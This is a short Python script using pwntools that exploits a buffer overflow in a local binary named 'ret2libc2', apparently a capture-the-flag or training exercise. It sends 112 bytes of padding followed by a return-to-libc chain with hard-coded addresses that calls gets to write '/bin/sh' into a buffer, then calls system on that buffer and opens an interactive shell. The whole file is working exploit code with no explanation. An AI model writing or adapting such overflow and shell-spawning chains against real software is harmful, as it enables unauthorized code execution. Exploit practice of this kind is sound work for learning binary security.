from pwn import *

io = process('./ret2libc2')

system_plt = 0x08048490
gets_plt = 0x08048460
pop_ebx_ret = 0x0804843d
buf2_addr = 0x0804A080

payload = flat(['A'*112,gets_plt,pop_ebx_ret,buf2_addr,system_plt,'bbbb',buf2_addr]) 
io.sendline(payload)
io.sendline('/bin/sh')

io.interactive()
